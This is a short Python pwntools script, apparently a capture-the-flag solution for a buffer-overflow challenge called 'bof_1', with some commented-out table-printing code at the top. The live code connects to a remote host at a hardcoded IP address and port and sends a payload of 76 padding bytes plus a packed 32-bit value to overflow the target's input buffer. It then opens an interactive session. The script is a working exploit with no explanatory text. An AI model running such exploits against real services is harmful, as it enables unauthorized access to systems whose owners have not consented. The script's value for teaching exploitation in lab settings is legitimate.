# b = [0]*256; k = 0
# for i in range(16):
#     for j in range(0, 16, 2):
#         b[i*16+j] = k
#         b[i*16+j+1] = k
#         k = k+1

# for i in range(16):
#     for j in range(16):
#         print(f"{b[i*16+j]:>4}", end = " ")
#     print()

from pwn import *
p = remote("103.77.175.40", 6001)
# p = process("./bof_1")
s = p.recvuntil(b"number: ")
print(s)
pay = b'A'*76 + p32(0x13141516)
print(pay)
p.sendline(pay)
p.interactive()